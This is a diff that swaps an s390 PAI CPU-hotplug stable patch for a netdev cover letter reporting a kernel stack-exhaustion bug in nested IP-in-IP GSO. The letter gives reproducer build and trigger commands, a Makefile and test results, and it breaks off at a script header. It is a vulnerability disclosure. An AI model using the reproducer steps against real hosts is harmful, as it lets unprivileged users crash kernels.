@@ -1,46 +1,80 @@
-Received: from smtp.kernel.org (aws-us-west-2-korg-mail-alma10-1.taild15c8.ts.net [100.103.45.18])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+Received: from mail-pz2-f41.google.com (mail-pz2-f41.google.com [74.125.228.41])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id E99A04B44AA;
-	Thu, 17 Sep 2026 16:00:55 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=100.103.45.18
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 6DBB34F3935
+	for <stable@vger.kernel.org>; Thu, 17 Sep 2026 16:00:55 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.228.41
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1789660857; cv=none; b=hckx0lpUWYD5fKDW4VSBcXQhINI/hIv39gWVd6PPJ03Z3um3EEDyABbuFnn5ilsXiXmSF6jDShvE/VyXYkS7bZhJZhmV0JcO6O6SpN3UjRfaVLArT0bJFW2VxK9lsQNrndbasj5245sMsm8utaXXhm1nHRgljY4UeAP6vpHm1r0=
+	t=1789660858; cv=none; b=hjv6IlHhKvE2COql7VDfTD+9gxv5LQtVhIPXMns/jIFeeoAfWqKi+f1XzkzbQUKyG25rmKwIjtecRAsywEkos1U/IVfr0zO+0r/Nl+FbWxMnRxbVERYuYK4DRYNss0SXG8B8s9DF5NQW30WvBeslo4kfk+4xbK3OAIKI9yTQ4A4=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1789660857; c=relaxed/simple;
-	bh=p6RiKMNCp7mMov8iI5CCDAUXioe6e3tfPj0qeunCAVM=;
-	h=From:To:Cc:Subject:Date:Message-ID:In-Reply-To:References:
-	 MIME-Version; b=KvSLGlXoelU8RICxuRhax1nuAfueT3LHdNRz0VvWPWBunHSfSmlSfZHW4m9+zTnQgkYdR4Z1dVhNIpEewIZfX4TP7wM2D3jZu0yEqSEgyQZRV2DkVSSWjNU3qK4V52O/c86rYqKkLGfn/rraqFBd479ei1uMhYSczYhg0lkhGJ4=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dkim=pass (1024-bit key) header.d=linuxfoundation.org header.i=@linuxfoundation.org header.b=UMvq3on+; arc=none smtp.client-ip=100.103.45.18
+	s=arc-20240116; t=1789660858; c=relaxed/simple;
+	bh=c2CTTQZqHpKZYGBgJbnHrW2y8pAoB3nFMG3Fbk4pTnw=;
+	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=UlSnwAFtZoTvcORN1mJA7tW5SVpGAtJlSFBRDmhIj2WKp2D5YZ281LNXRIrLSyKzkPfhQdJX4B64nXsches17Eb1h/Sb6WSdSSSFS+z9SBW4C8WMhyxLeI2Rs8ba8iirG93gCrvoJNmv1NaILtrbSvx9OdIGm0ZORWBzyz7xH5c=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=oA5V9Vku; arc=none smtp.client-ip=74.125.228.41
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (1024-bit key) header.d=linuxfoundation.org header.i=@linuxfoundation.org header.b="UMvq3on+"
-Received: by smtp.kernel.org (Postfix) with ESMTPSA id 36AB51F000FF;
-	Thu, 17 Sep 2026 16:00:55 +0000 (UTC)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=linuxfoundation.org;
-	s=korg; t=1789660855;
-	bh=YxmGHPoptR7fxFVkFCkeCmQ3aSQVhvB6W0Gh98YpwzM=;
-	h=From:To:Cc:Subject:Date:In-Reply-To:References;
-	b=UMvq3on+FYs+uL0bo26CEBlFJzZVU52J5G2ocMz0+QESDWdyCMZdI5JHx2e92VZde
-	 xQKEcJST9Jpd4a/EwIqQ+0CGkRhnrRuOhyC+UZedIFQxOPNeYwnuqsI1LpRcm9JN5+
-	 dlvVqgo6LATfMmFKxiEh9H5tjLQifjWR0j/CGUxs=
-From: Greg Kroah-Hartman <gregkh@linuxfoundation.org>
-To: stable@vger.kernel.org
-Cc: Greg Kroah-Hartman <gregkh@linuxfoundation.org>,
-	patches@lists.linux.dev,
-	Thomas Richter <tmricht@linux.ibm.com>,
-	Jan Polensky <japo@linux.ibm.com>,
-	Heiko Carstens <hca@linux.ibm.com>,
-	Vasily Gorbik <gor@linux.ibm.com>,
-	Sasha Levin <sashal@kernel.org>
-Subject: [PATCH 7.2 730/733] s390/pai: Support CPU hotplug for PMU PAI
-Date: Thu, 17 Sep 2026 16:17:18 +0100
-Message-ID: <20260917151411.182070782@linuxfoundation.org>
-X-Mailer: git-send-email 2.55.0
-In-Reply-To: <20260917151350.597953846@linuxfoundation.org>
-References: <20260917151350.597953846@linuxfoundation.org>
-User-Agent: quilt/0.69
-X-stable: review
-X-Patchwork-Hint: ignore
+	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="oA5V9Vku"
+Received: by mail-pz2-f41.google.com with SMTP id d2e1a72fcca58-8674704dab1so1300091b3a.2
+        for <stable@vger.kernel.org>; Thu, 17 Sep 2026 09:00:55 -0700 (PDT)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=nebusec.ai; s=google; t=1789660855; x=1790265655; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
+        bh=EzIt+WRP8WQ8BBHgo9JaMmXOdWaHIteC0zTy6cHnlUc=;
+        b=oA5V9VkueVOFfV4G8gJ+Gxi20cTcIzzYdUjchugUgPlUc95Vw0d3ArvdoJdeagxysK
+         iK96yDJJBxJg7QvDlMFi3s0WPzDhR89pCEP7tSNTnHke2JyoR/0n9UnRvR8z6OY/RnU4
+         CcMYK0wPXrNKazQbhVE+WbjRWPlXfWQpfhOczBBcWOIV1qq0HNqKamKzOwxEQbo577lz
+         vcbRCF7mSM44qiuqWXGqzjjAqbo5WMLmFu54B+qBZB/337SwsaBDQ2dwHAA/6Mjmy7uu
+         KHkTpXFDelZg22hqvdS5OQx6k0fouUKEVqX2RKc9ZjmqzFTmJp2zHX8p/1jZL6cPtkfk
+         L8Vg==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20260707; t=1789660855; x=1790265655;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+         :message-id:reply-to:content-type;
+        bh=EzIt+WRP8WQ8BBHgo9JaMmXOdWaHIteC0zTy6cHnlUc=;
+        b=Ax+FW6EK2vbWqdCxhGSAMe8NdXNF2sU2cKvNYm7Jr6/VpINCl5irBwBvCh20KJdxql
+         fOzCJP9nVuEBcRPWivhNUrdgdm4FHAhoaiX4oSeCi9npROzmdD+YQLMaiC5PqlEoJm3Z
+         A/bKwvB/3Pl3z7HBJ+Kz4ssxEq8NAYc+/dHQgQXsxhuUis8YxKQ0CAWorD6TX1eGPCDi
+         UIdwrGo6MvrWlxv3p5uuWUr6bVyzgMNNSkOs/JClIUfGOu118DYjC8Jf+oedgBBnafQR
+         R1bfbSIvH3oKruvdCzxYI0hCI7FHAWMqsf9zK8AlijrTxYPb/Spj/J58gFZDxHiJrOrg
+         t91w==
+X-Forwarded-Encrypted: i=1; AKwUvBzf6MSyul1SDBzCvfgHZVMG9NEZZ2iXFMgLSclzGK1f9y6XoiCYhvxyOpiqfgf3D0Ur2QGdjs0=@vger.kernel.org
+X-Gm-Message-State: AFuF++nAtlFiTWLGcbS63Sf9pJ88V36Z4Qd+0rINtpgehRgFtui1OCj5
+	YzjGXQKMErmvcpD18XgNhNp0LZaUPEb0sTh0zYMnKJCaXdt16CM4EuscpsdN98veSRU4
+X-Gm-Gg: AYBFou2ohc7iE+wJ8ylXuIUmWEsig+eyRXjnFpJsUsmHjW3c8OMkR/ECipR6Hzod/Ml
+	4t9ZMs+arLfArhARDQtAhVTnoZK5xkBeV880OKNmEaFVgQPsaPHKIlxSUEdHcB83M+OpMquq6r/
+	ewrHqLTWJqdLRWJLYpt2On1OZhsb3ULbcv/+KYI4ETrz/n9+pOwn5ewzOAc39N44pP0msIoc7m3
+	7vAo5JDYeBrcIEifrJxRDD5aJcdjcKj5Hk9n2Sau2UMcv+txPA4tLzYNK6w8925+WvYi0sSVf86
+	T7dnUE1mkvsOMjnQvI1YMiVaVPp7s4ckdl08CmGyFtYBFFOTV1DBPn4akqzD8DAW0IIfKMZ0ZhX
+	v8cl4w8ku+Cz/oPNWQNa6jhGumaa4j7xJ4GoX0tJ346CZpFUQKPEfnbpKWn3Y7Kf691lUjvO9Eb
+	us2mu+Ay6vEOarm6BfGe3i4stJm6wXN2zblXi0gNRZGBAhntqKzkpRJM3OF2epWTh8YGqg9pJfD
+	NbTa4+6fTKOkaP3T6D50NP6m55VZSVzSLk78O/c
+X-Received: by 2002:a05:6a20:72a1:b0:3da:f969:b077 with SMTP id adf61e73a8af0-3dd5f495c5amr17786406637.11.1789660853965;
+        Thu, 17 Sep 2026 09:00:53 -0700 (PDT)
+Received: from b6ad5085b32f.. ([122.51.212.64])
+        by smtp.gmail.com with ESMTPSA id 41be03b00d2f7-cc50c24487bsm3182043a12.12.2026.09.17.09.00.48
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Thu, 17 Sep 2026 09:00:52 -0700 (PDT)
+From: Zihan Xi <zihanx@nebusec.ai>
+To: netdev@vger.kernel.org
+Cc: zihanx@nebusec.ai,
+	davem@davemloft.net,
+	edumazet@google.com,
+	kuba@kernel.org,
+	pabeni@redhat.com,
+	horms@kernel.org,
+	steffen.klassert@secunet.com,
+	herbert@gondor.apana.org.au,
+	dsahern@kernel.org,
+	idosch@nvidia.com,
+	linux-kernel@vger.kernel.org,
+	stable@vger.kernel.org
+Subject: [PATCH net v2 0/1] net: gso: limit recursive IP-in-IP segmentation
+Date: Thu, 17 Sep 2026 16:00:40 +0000
+Message-ID: <cover.1789618203.git.zihanx@nebusec.ai>
+X-Mailer: git-send-email 2.47.3
 Precedence: bulk
 X-Mailing-List: stable@vger.kernel.org
 List-Id: <stable.vger.kernel.org>
@@ -49,369 +83,752 @@ List-Unsubscribe: <mailto:stable+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
 Content-Transfer-Encoding: 8bit
 
-7.2-stable review patch.  If anyone has any objections, please let me know.
+Hi Linux kernel maintainers,
 
-------------------
+We found and validated an issue in net/core/gso.c. The affected paths are
+skb_mac_gso_segment(), inet_gso_segment(), and ipv6_gso_segment(); nested
+IP-in-IP GSO has no bound on callback nesting. The bug is reachable by a
+non-root user through private user and network namespaces. The BPF/veth
+reproducer needs root in the initial user namespace; the namespace-only
+reproducer starts as UID 65534. The change is expected not to affect other
+functionality; validation covered IPv4 BPF/veth and namespace-only paths on
+x86_64. IPv6 was compile-checked, but no separate IPv6 runtime
+test was run.
 
-From: Thomas Richter <tmricht@linux.ibm.com>
+Changes in v2:
+  - Replace the callback counter with a cumulative 256-byte header budget
+    carried in skb_gso_cb.
+  - Apply the budget at common callback entry and across IP, GRE, UDP,
+    MPLS, NSH, ESP, and IPv6 extension dispatch, including GRE/UDP
+    context resets.
+  - Rebase the UDP hunk onto selected revision c9151088f167 and rerun both
+    IPv4 PoCs; use the decoded crash evidence from unpatched 88c17de85ddb.
+  - v1 Link: https://lore.kernel.org/all/cover.1789302084.git.zihanx@nebusec.ai/
 
-[ Upstream commit 9ecc4d033879f7761f2df07e20cd2fbec00fd90b ]
+We will provide detailed information about the bug
+in this email, along with a PoC to trigger it.
+The detailed bug information, PoC, and decoded crash output are
+included below.
 
-The command 'perf stat -e pai_crypto/CRYPTO_ALL/ -- <command>'
-crashes the kernel when CPUs are hotplug added during that run.
+---- details below ----
 
-Root cause is the missing allocation of per-CPU data structures
-for that new CPU. The allocation is dynamic and the first
-event that has task context creates such a structure for
-each online CPU. This is not sufficient. CPUs may be offline
-during event creation and can be set online during the
-perf run time. For example commands
+Bug details:
 
- # echo 0 > /sys/devices/system/cpu/cpu1/online
- # perf stat -e cycles -i -- stress-ng -t10s --matrix X
- # sleep 1
- # echo 1 > /sys/devices/system/cpu/cpu1/online
+An IP-in-IP GSO packet reaches skb_mac_gso_segment() and re-enters the
+IPv4 or IPv6 GSO handler for each nested IP header. The encap_level
+only records header bytes; it does not bound callback depth. A deep
+chain can exhaust the kernel stack before a transport GSO callback is
+reached.
 
-Currently without a CPU hotplug handler, that new CPU has no
-per-CPU data infrastructure. The scheduler runs PMU call back
-function pai_add() to install the PMU support for that CPU before
-the task is being scheduled on that new CPU.
-In pai_add() instructions
+The fix initializes gso_header_len in skb_gso_cb for each top-level GSO
+operation and charges header bytes before inner dispatch. The common
+callback wrapper checks the same state, so direct IP re-entry and nested
+tunnel callbacks share one monotonic budget. GRE and UDP encap_level
+resets cannot restart it.
 
-    mp = this_cpu_ptr(pai_root[idx].mapptr);
-    cpump = mp->mapptr;
+GSO_MAX_HEADER is a practical 256-byte header budget, not a measured
+stack-overflow threshold or an architecture-independent stack-safety proof.
+With no initial offset, 12 minimum-sized IPv4 headers use 240 bytes and the
+next header is rejected. IPv6, extension, and tunnel headers use the budget
+faster. The fixed x86_64 run completed without a stack-guard fault, but it
+does not establish a uniform margin for architectures with smaller stacks.
 
-return a NULL pointer and the result is a kernel panic as variable
-cpump is used inside that function.
+The IPv4 stackable re-entry mechanism was introduced by
+3347c9602955 ("ipv4: gso: make inet_gso_segment() stackable").
+68c331631143 ("v4 GRE: Add TCP segmentation offload for GRE") predates it,
+and cb32f511a70b ("ipip: add GSO/TSO support") later expanded the reachable
+IP-in-IP path. The IPv6 stackable path was introduced separately by
+d3e5e0062de5 ("ipv6: gso: make ipv6_gso_segment() stackable"). Fixes points
+to 3347c9602955 for the IPv4 root cause.
 
-Add CPU hotplug support for CPU add and delete and create
-the necessary per-CPU data infrastructure during CPU hotplug
-add processing. Same for CPU hotplug remove.
-This is done when the CPU is offline to ensure the data structures
-are available when CPU is made online and tasks are scheduled on it.
+Reproducer:
 
-[hca@linux.ibm.com: fixup error path in pai_init()]
+BPF/veth path (run as root in the initial user namespace):
 
-Cc: stable@vger.kernel.org # v6.19
-Fixes: 582cc1b28e8c ("s390/pai_ext: Enable per-task and system-wide sampling event")
-Fixes: 9f66572f2889 ("s390/pai_crypto: Enable per-task and system-wide sampling event")
-Signed-off-by: Thomas Richter <tmricht@linux.ibm.com>
-Reviewed-by: Jan Polensky <japo@linux.ibm.com>
-Signed-off-by: Heiko Carstens <hca@linux.ibm.com>
-Signed-off-by: Vasily Gorbik <gor@linux.ibm.com>
-Signed-off-by: Sasha Levin <sashal@kernel.org>
-Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>
----
- arch/s390/include/asm/pai.h |    1 
- arch/s390/kernel/perf_pai.c |  178 +++++++++++++++++++++++++++++++-------------
- 2 files changed, 128 insertions(+), 51 deletions(-)
+    make clean all
+    ./poc.sh
 
---- a/arch/s390/include/asm/pai.h
-+++ b/arch/s390/include/asm/pai.h
-@@ -76,7 +76,6 @@ static __always_inline void pai_kernel_e
- }
- 
- #define PAI_SAVE_AREA(x)	((x)->hw.event_base)
--#define PAI_CPU_MASK(x)		((x)->hw.addr_filters)
- #define PAI_PMU_IDX(x)		((x)->hw.last_tag)
- #define PAI_SWLIST(x)		(&(x)->hw.tp_list)
- 
---- a/arch/s390/kernel/perf_pai.c
-+++ b/arch/s390/kernel/perf_pai.c
-@@ -67,6 +67,7 @@ struct pai_mapptr {
- 
- static struct pai_root {		/* Anchor to per CPU data */
- 	refcount_t refcnt;		/* Overall active events */
-+	atomic_t tskctx;		/* Overall per-task events */
- 	struct pai_mapptr __percpu *mapptr;
- } pai_root[PAI_PMU_MAX];
- 
-@@ -93,14 +94,15 @@ struct pai_pmu {			/* Define PAI PMU cha
- static struct pai_pmu pai_pmu[];	/* Forward declaration */
- 
- /* Free per CPU data when the last event is removed. */
--static void pai_root_free(int idx)
-+static void pai_root_free(int idx, int tasks)
- {
--	if (refcount_dec_and_test(&pai_root[idx].refcnt)) {
-+	if (refcount_sub_and_test(tasks, &pai_root[idx].refcnt)) {
- 		free_percpu(pai_root[idx].mapptr);
- 		pai_root[idx].mapptr = NULL;
- 	}
--	debug_sprintf_event(paidbg, 5, "%s root[%d].refcount %d\n", __func__,
--			    idx, refcount_read(&pai_root[idx].refcnt));
-+	debug_sprintf_event(paidbg, 5, "%s root[%d].refcount %d tskctx %d\n",
-+			    __func__, idx, refcount_read(&pai_root[idx].refcnt),
-+			    atomic_read(&pai_root[idx].tskctx));
- }
- 
- /*
-@@ -137,20 +139,36 @@ static void pai_free(struct pai_mapptr *
- 	mp->mapptr = NULL;
- }
- 
--/* Adjust usage counters and remove allocated memory when all users are
-- * gone. Called under mutex_lock.
-- */
--static void pai_event_destroy_cpu(int idx, int cpu)
-+/* Called under mutex_lock */
-+static void pai_event_destroy_cpu(int idx, int cpu, bool hotplug)
- {
--	struct pai_mapptr *mp = per_cpu_ptr(pai_root[idx].mapptr, cpu);
--	struct pai_map *cpump = mp->mapptr;
-+	struct pai_mapptr *mp;
-+	struct pai_map *cpump;
-+	int tasks = 1;
- 
--	debug_sprintf_event(paidbg, 5, "%s users %d refcnt %u\n",
--			    __func__, cpump->active_events,
--			    refcount_read(&cpump->refcnt));
--	if (refcount_dec_and_test(&cpump->refcnt))
-+	/* Check reference count and return when all gone.
-+	 * 1. An event is installed on online CPU X.
-+	 * 2. CPU x is offlined and the per-CPU data is removed.
-+	 * 3. Event is destroyed via close system call.
-+	 */
-+	if (!refcount_read(&pai_root[idx].refcnt))
-+		return;			/* No events at all */
-+	mp = per_cpu_ptr(pai_root[idx].mapptr, cpu);
-+	if (!mp || !mp->mapptr)		/* No events on that CPU */
-+		return;
-+
-+	/* When hotplug is true, invocation is from CPU hotplug callback.
-+	 * Delete per-CPU resource and adjust refcnt when per-task events
-+	 * are currently active. This can be more than one.
-+	 * In this case adjust counters.
-+	 */
-+	if (hotplug)
-+		tasks = atomic_read(&pai_root[idx].tskctx);
-+
-+	cpump = mp->mapptr;
-+	if (refcount_sub_and_test(tasks, &cpump->refcnt))
- 		pai_free(mp);
--	pai_root_free(idx);
-+	pai_root_free(idx, tasks);
- }
- 
- static void pai_event_destroy(struct perf_event *event)
-@@ -158,17 +176,17 @@ static void pai_event_destroy(struct per
- 	int cpu = 0, idx = PAI_PMU_IDX(event);
- 
- 	free_page(PAI_SAVE_AREA(event));
-+	cpus_read_lock();
- 	mutex_lock(&pai_reserve_mutex);
- 	if (event->cpu == -1) {
--		struct cpumask *mask = PAI_CPU_MASK(event);
--
--		for_each_cpu(cpu, mask)
--			pai_event_destroy_cpu(idx, cpu);
--		kfree(mask);
-+		atomic_dec(&pai_root[idx].tskctx);
-+		for_each_online_cpu(cpu)
-+			pai_event_destroy_cpu(idx, cpu, false);
- 	} else {
--		pai_event_destroy_cpu(idx, event->cpu);
-+		pai_event_destroy_cpu(idx, event->cpu, false);
- 	}
- 	mutex_unlock(&pai_reserve_mutex);
-+	cpus_read_unlock();
- }
- 
- static void paicrypt_event_destroy(struct perf_event *event)
-@@ -232,17 +250,25 @@ static u64 paicrypt_getall(struct perf_e
- 	return sum;
- }
- 
--/* Allocate all per-CPU data structures. This function is called in
-- * process context and can block. In case of error all partly allocated
-- * memory is released and the reference counters adjusted correctly.
-- * Called under mutex_lock.
-- */
--static int pai_alloc_cpu(int idx, int cpu)
-+/* Called under mutex_lock */
-+static int pai_alloc_cpu(int idx, int cpu, bool hotplug)
- {
- 	struct pai_map *cpump = NULL;
- 	bool need_paiext_cb = false;
- 	struct pai_mapptr *mp;
--	int rc;
-+	int tasks = 1, rc = 0;
-+
-+	/* When hotplug is true, invocation is from CPU hotplug callback.
-+	 * Allocate per-CPU resource when per-task events are currently active.
-+	 * This can be more than one. In this case adjust all reference
-+	 * counters. Otherwise return, this ensures memory is only allocated
-+	 * when needed.
-+	 */
-+	if (hotplug) {
-+		tasks = atomic_read(&pai_root[idx].tskctx);
-+		if (!tasks)
-+			goto out;
-+	}
- 
- 	/* Allocate root node */
- 	rc = pai_root_alloc(idx);
-@@ -291,26 +317,42 @@ static int pai_alloc_cpu(int idx, int cp
- 			goto undo;
- 		}
- 		INIT_LIST_HEAD(&cpump->syswide_list);
--		refcount_set(&cpump->refcnt, 1);
-+		refcount_set(&cpump->refcnt, tasks);
- 		rc = 0;
- 	} else {
--		refcount_inc(&cpump->refcnt);
-+		refcount_add(tasks, &cpump->refcnt);
- 	}
-+	/* If tasks is greater than 1, we are called from CPU hotplug path
-+	 * and need to adjust the pai_root[idx].refcnt by the number of
-+	 * per-process events. Function pai_root_alloc(idx) already
-+	 * incremented by one. Adjust for the rest.
-+	 */
-+	if (tasks > 1)
-+		refcount_add(tasks - 1, &pai_root[idx].refcnt);
- 
- undo:
- 	if (rc) {
- 		/* Error in allocation of event, decrement anchor. Since
- 		 * the event in not created, its destroy() function is never
- 		 * invoked. Adjust the reference counter for the anchor.
-+		 * The failure happened in the case of variable
-+		 * cpump == NULL branch above. The pai_root[XXX].refcnt has
-+		 * been incremented by one. Then the per-CPU allocation
-+		 * failed, so decrement it by one, regardless of tasks.
- 		 */
--		pai_root_free(idx);
-+		pai_root_free(idx, 1);
- 	}
- out:
- 	/* If rc is non-zero, no increment of counter/sampler was done. */
- 	return rc;
- }
- 
--/* Called under mutex_lock */
-+/* Check concurrent access of counting and sampling for PAI events.
-+ * This function is called in process context and it is safe to block.
-+ * When the event initialization functions fails, no other call back will
-+ * be invoked.
-+ * Called under mutex_lock.
-+ */
- static int pai_alloc(struct perf_event *event)
- {
- 	int idx = PAI_PMU_IDX(event);
-@@ -322,24 +364,20 @@ static int pai_alloc(struct perf_event *
- 		goto out;
- 
- 	for_each_online_cpu(cpu) {
--		rc = pai_alloc_cpu(idx, cpu);
-+		rc = pai_alloc_cpu(idx, cpu, false);
- 		if (rc) {
- 			for_each_cpu(cpu, maskptr)
--				pai_event_destroy_cpu(idx, cpu);
--			kfree(maskptr);
--			goto out;
-+				pai_event_destroy_cpu(idx, cpu, false);
-+			goto undo;
- 		}
- 		cpumask_set_cpu(cpu, maskptr);
- 	}
- 
--	/*
--	 * On error all cpumask are freed and all events have been destroyed.
--	 * Save of which CPUs data structures have been allocated for.
--	 * Release them in pai_event_destroy call back function
--	 * for this event.
--	 */
--	PAI_CPU_MASK(event) = maskptr;
- 	rc = 0;
-+	/* Trace per-task events for CPU hotplug. */
-+	atomic_inc(&pai_root[idx].tskctx);
-+undo:
-+	kfree(maskptr);
- out:
- 	return rc;
- }
-@@ -387,12 +425,14 @@ static int pai_event_init(struct perf_ev
- 		}
- 	}
- 
-+	cpus_read_lock();
- 	mutex_lock(&pai_reserve_mutex);
- 	if (event->cpu >= 0)
--		rc = pai_alloc_cpu(idx, event->cpu);
-+		rc = pai_alloc_cpu(idx, event->cpu, false);
- 	else
- 		rc = pai_alloc(event);
- 	mutex_unlock(&pai_reserve_mutex);
-+	cpus_read_unlock();
- 	if (rc) {
- 		free_page(PAI_SAVE_AREA(event));
- 		goto out;
-@@ -1216,8 +1256,35 @@ static int __init paipmu_setup(void)
- 	return install_ok;
- }
- 
-+static int pai_online_cpu(unsigned int cpu)
-+{
-+	int rc;
-+
-+	mutex_lock(&pai_reserve_mutex);
-+	rc = pai_alloc_cpu(PAI_PMU_CRYPTO, cpu, true);
-+	if (rc)
-+		goto out;
-+	rc = pai_alloc_cpu(PAI_PMU_EXT, cpu, true);
-+	if (rc)
-+		pai_event_destroy_cpu(PAI_PMU_CRYPTO, cpu, true);
-+out:
-+	mutex_unlock(&pai_reserve_mutex);
-+	return rc;
-+}
-+
-+static int pai_offline_cpu(unsigned int cpu)
-+{
-+	mutex_lock(&pai_reserve_mutex);
-+	pai_event_destroy_cpu(PAI_PMU_CRYPTO, cpu, true);
-+	pai_event_destroy_cpu(PAI_PMU_EXT, cpu, true);
-+	mutex_unlock(&pai_reserve_mutex);
-+	return 0;
-+}
-+
- static int __init pai_init(void)
- {
-+	int state, rc;
-+
- 	/* Setup s390dbf facility */
- 	paidbg = debug_register("pai", 1, 1, 128);
- 	if (!paidbg) {
-@@ -1226,13 +1293,24 @@ static int __init pai_init(void)
- 	}
- 	debug_register_view(paidbg, &debug_sprintf_view);
- 
--	if (!paipmu_setup()) {
--		/* No PMU registration, no need for debug buffer */
--		debug_unregister_view(paidbg, &debug_sprintf_view);
--		debug_unregister(paidbg);
--		return -ENODEV;
--	}
-+	/* CPUHP_BP_PREPARE_DYN --> before CPU is brought online */
-+	state = cpuhp_setup_state(CPUHP_BP_PREPARE_DYN, "perf/pai:prepare",
-+				  pai_online_cpu, pai_offline_cpu);
-+	rc = state < 0 ? state : 0;
-+	if (rc < 0)
-+		goto out_debug;
-+
-+	rc = -ENODEV;
-+	if (!paipmu_setup())
-+		goto out_cpuhp;
- 	return 0;
-+
-+out_cpuhp:
-+	cpuhp_remove_state(state);
-+out_debug:
-+	debug_unregister_view(paidbg, &debug_sprintf_view);
-+	debug_unregister(paidbg);
-+	return rc;
- }
- 
- device_initcall(pai_init);
+The checked-in Makefile builds poc and tc_mutate.bpf.o. With KDIR
+unset, the BPF command is:
+
+    clang -O2 -g -target bpf -D__TARGET_ARCH_x86 -Wall -Wextra \
+        -I/usr/include/x86_64-linux-gnu \
+        -DINSERTED_IPS=199 -DTRIGGER_PORT=4242 \
+        -c tc_mutate.bpf.c -o tc_mutate.bpf.o
+
+Runtime needs gcc, clang, iproute2, ethtool, and perl. With no Python 3,
+poc.sh used this actual Perl fallback:
+
+    ip netns exec "$NS" "$DIR/net-server-perl.sh" &
+
+The namespace-only path attempted these setup commands:
+
+    apt-get install -y ethtool
+    cc -O2 -static -g -Wall -Wextra -o poc_privilege_optimized poc_privilege_optimized.c
+
+The guest apt mirror was unavailable, so the final run copied the host
+`/usr/sbin/ethtool` and these runtime files into
+`/usr/local/lib/ethtool-host/`:
+
+    /lib/x86_64-linux-gnu/libmnl.so.0
+    /lib/x86_64-linux-gnu/libm.so.6
+    /lib/x86_64-linux-gnu/libc.so.6
+    /lib64/ld-linux-x86-64.so.2
+
+The wrapper was copied from `verify/ethtool-host-wrapper-public.sh`. Omitting
+only the test harness's SSH identity, port, and host-key options, the copy
+and install commands were:
+
+    ssh root@127.0.0.1 'mkdir -p /usr/local/lib/ethtool-host'
+    scp /usr/sbin/ethtool /lib/x86_64-linux-gnu/libmnl.so.0 \
+        /lib/x86_64-linux-gnu/libm.so.6 /lib/x86_64-linux-gnu/libc.so.6 \
+        /lib64/ld-linux-x86-64.so.2 \
+        root@127.0.0.1:/usr/local/lib/ethtool-host/
+    scp verify/ethtool-host-wrapper-public.sh \
+        root@127.0.0.1:/usr/local/lib/ethtool-host/ethtool-wrapper
+    ssh root@127.0.0.1 \
+        'chmod 755 /usr/local/lib/ethtool-host/ethtool-wrapper; \
+         ln -sf /usr/local/lib/ethtool-host/ethtool-wrapper /usr/sbin/ethtool'
+
+The run then launched the trigger as UID 65534 with:
+
+    su -s /bin/sh nobody -c 'cd /tmp/q7x-ns && exec ./poc_privilege_optimized.sh 180 1400'
+
+The private user namespace maps it to UID 0. Packetdrill is not used
+because the trigger needs network namespaces, IPIP devices, tc egress BPF
+header insertion, and UDP_SEGMENT control data, which cannot be expressed
+as a packetdrill packet sequence.
+
+We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
+
+The fixed kernel build at 33280f6e07bccaaeef2c70f1754017e9517f5aa5 returned
+BUILD_RC=0. The fixed BPF/veth run used the Perl fallback, sent 65536
+bytes, and returned REMOTE_RC=0 and DMESG_RC=0. The fixed
+namespace-only run was launched as UID 65534 with depth 180 and gso_size
+1400; it sent a 3676-byte payload, returned 3676 from sendmsg(), and
+returned REMOTE_RC=0 and DMESG_RC=0.
+Neither fixed run showed a crash marker.
+
+REMOTE_RC=0 means normal completion. REMOTE_RC=124 means the host-side
+timeout expired. The unpatched runs returned REMOTE_RC=255 (and
+DMESG_RC=255 for BPF) after the guest became unreachable; these are
+wrapper statuses, not kernel
+error codes.
+
+------BEGIN Makefile------
+CC ?= gcc
+CLANG ?= clang
+KDIR ?=
+BPF_CFLAGS ?= -O2 -g -target bpf -D__TARGET_ARCH_x86 -Wall -Wextra -I/usr/include/x86_64-linux-gnu $(if $(KDIR),-I$(KDIR)/tools/lib/bpf)
+CFLAGS ?= -O2 -Wall -Wextra
+INSERTED_IPS ?= 199
+TRIGGER_PORT ?= 4242
+
+all: poc tc_mutate.bpf.o
+
+poc: poc.c
+	$(CC) $(CFLAGS) -o $@ $<
+
+tc_mutate.bpf.o: tc_mutate.bpf.c
+	$(CLANG) $(BPF_CFLAGS) -DINSERTED_IPS=$(INSERTED_IPS) -DTRIGGER_PORT=$(TRIGGER_PORT) -c -o $@ $<
+
+clean:
+	rm -f poc tc_mutate.bpf.o
+------END Makefile--------
+
+------BEGIN net-server-perl.sh------
+#!/bin/sh
